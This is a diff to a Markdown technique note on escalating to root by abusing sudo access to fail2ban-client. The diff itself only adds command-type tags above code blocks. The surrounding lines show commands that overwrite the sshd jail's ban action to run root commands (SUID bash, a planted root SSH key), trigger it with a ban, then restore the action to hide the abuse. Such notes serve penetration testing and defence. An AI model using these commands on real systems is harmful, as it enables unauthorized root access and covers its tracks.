@@ -13,6 +13,7 @@ When `sudo -l` allows a non-root user to run `fail2ban-client` without a passwor
 - At least one existing jail (commonly `sshd`).
 
 ### Check
+<!-- cmd: linux -->
 ```bash
 sudo -l
 # Matching Defaults entries for asterisk on HOST:
@@ -24,6 +25,7 @@ sudo -l
 ```
 
 If no explicit jail is visible, list them:
+<!-- cmd: linux -->
 ```bash
 sudo /usr/bin/fail2ban-client status
 # Jail list: sshd
@@ -41,6 +43,7 @@ Key nuance: the `actionban` value is a shell snippet passed to `/bin/sh -c`. No 
 
 ## 3. Exploitation
 
+<!-- cmd: linux -->
 ```bash
 # 1. Overwrite the ban action for the sshd jail
 sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
@@ -68,6 +71,7 @@ The whole chain runs in under five seconds.
 
 Instead of SUID bash, any root command works:
 
+<!-- cmd: linux -->
 ```bash
 # Drop an SSH key for root
 sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
@@ -91,6 +95,7 @@ sudo /usr/bin/fail2ban-client set sshd banip 4.5.6.7
 
 Restore the legitimate actionban to avoid breaking fail2ban on the target (and to hide the abuse):
 
+<!-- cmd: linux -->
 ```bash
 sudo /usr/bin/fail2ban-client set sshd unbanip 1.2.3.4
 sudo /usr/bin/fail2ban-client reload
